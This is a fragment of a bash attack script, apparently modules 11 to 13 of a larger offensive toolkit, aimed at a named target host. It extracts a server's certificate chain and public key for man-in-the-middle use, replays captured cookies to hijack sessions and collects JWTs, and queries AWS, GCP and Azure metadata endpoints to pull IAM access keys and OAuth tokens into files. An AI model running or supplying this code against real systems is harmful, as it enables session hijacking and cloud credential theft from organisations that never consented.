bt_11_ssl_cert_pinning_bypass() {
    _section "[BT 11/30] SSL CERTIFICATE PINNING BYPASS"
    run "Extracting certificates for pinning bypass analysis..."
    > "$SESSION/bt/ssl_pinning.txt"
    # Extract full certificate chain
    echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" -showcerts 2>/dev/null > "$SESSION/bt/cert_chain.pem"
    # Parse certificates
    local cert_count=$(grep -c "BEGIN CERTIFICATE" "$SESSION/bt/cert_chain.pem" 2>/dev/null || echo 0)
    [ "$cert_count" -gt 0 ] && {
        echo "$cert_count certificates in chain" >> "$SESSION/bt/ssl_pinning.txt"
        openssl x509 -in "$SESSION/bt/cert_chain.pem" -noout -subject -issuer -dates 2>/dev/null >> "$SESSION/bt/ssl_pinning.txt"
        # Extract public key for potential MITM
        openssl x509 -in "$SESSION/bt/cert_chain.pem" -noout -pubkey 2>/dev/null > "$SESSION/bt/target_pubkey.pem"
        [ -s "$SESSION/bt/target_pubkey.pem" ] && echo "Public key extracted" >> "$SESSION/bt/ssl_pinning.txt"
    }
    # Check for self-signed (easy bypass)
    local self_signed=$(openssl x509 -in "$SESSION/bt/cert_chain.pem" -noout -issuer -subject 2>/dev/null | sort -u | wc -l)
    [ "$self_signed" = "1" ] && echo "SELF-SIGNED CERT — pinning bypass trivial" >> "$SESSION/bt/ssl_pinning.txt"
    bt "SSL pinning analysis complete"
}

bt_12_cookie_session_reuse() {
    _section "[BT 12/30] COOKIE SESSION REUSE TEST"
    run "Testing session reuse from captured cookies..."
    > "$SESSION/bt/cookie_hijack.txt"
    [ ! -s "$SESSION/auth/cookies_raw.txt" ] && { info "No cookies to hijack"; return; }
    # Extract cookies and test session reuse
    while read -r cookie_line; do
        local cookie_val=$(echo "$cookie_line" | grep -oE '[a-zA-Z_]+=[^;]+' | head -1)
        [ -z "$cookie_val" ] && continue
        local resp=$(curl -s -b "$cookie_val" -o /dev/null -w "%{http_code}" "https://$TARGET/profile" --connect-timeout 8 2>/dev/null)
        [ "$resp" = "200" ] && echo "SESSION VALID: $cookie_val -> /profile HTTP 200" >> "$SESSION/bt/cookie_hijack.txt"
    done < "$SESSION/auth/cookies_raw.txt"
    # Check for JWT in cookies
    local jwt_cookie=$(grep -oiE 'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{0,}' "$SESSION/auth/cookies_raw.txt" 2>/dev/null | head -1)
    [ -n "$jwt_cookie" ] && {
        echo "JWT in cookie: ${jwt_cookie:0:50}..." >> "$SESSION/bt/cookie_hijack.txt"
        echo "$jwt_cookie" > "$SESSION/auth/jwt_found.txt"
    }
    [ -s "$SESSION/bt/cookie_hijack.txt" ] && bt "Cookie session reuse test complete"
}

bt_13_aws_metadata_exfil() {
    _section "[BT 13/30] CLOUD METADATA EXTRACTION"
    run "Attempting to extract cloud provider metadata..."
    > "$SESSION/bt/cloud_metadata.txt"
    # AWS IMDS
    local aws_token=$(curl -s -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token" --connect-timeout 5 2>/dev/null)
    [ -n "$aws_token" ] && {
        local aws_identity=$(curl -s -H "X-aws-ec2-metadata-token: $aws_token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" --connect-timeout 5 2>/dev/null)
        [ -n "$aws_identity" ] && {
            echo "AWS IMDSv2 TOKEN ACQUIRED" >> "$SESSION/bt/cloud_metadata.txt"
            local role=$(echo "$aws_identity" | head -1)
            local creds=$(curl -s -H "X-aws-ec2-metadata-token: $aws_token" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" --connect-timeout 5 2>/dev/null)
            echo "$creds" | grep -oE '"AccessKeyId":"[^"]*"|"SecretAccessKey":"[^"]*"' >> "$SESSION/bt/cloud_metadata.txt"
            bt "AWS credentials extracted from metadata!"
        }
    }
    # GCP metadata
    local gcp=$(curl -s -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" --connect-timeout 5 2>/dev/null)
    echo "$gcp" | grep -q '"access_token"' && { echo "GCP metadata token extracted" >> "$SESSION/bt/cloud_metadata.txt"; bt "GCP token extracted!"; }
    # Azure metadata
    local azure=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --connect-timeout 5 2>/dev/null)
    echo "$azure" | grep -q '"access_token"' && { echo "Azure MSI token extracted" >> "$SESSION/bt/cloud_metadata.txt"; bt "Azure token extracted!"; }
    [ ! -s "$SESSION/bt/cloud_metadata.txt" ] && echo "No cloud metadata accessible" >> "$SESSION/bt/cloud_metadata.txt"
}

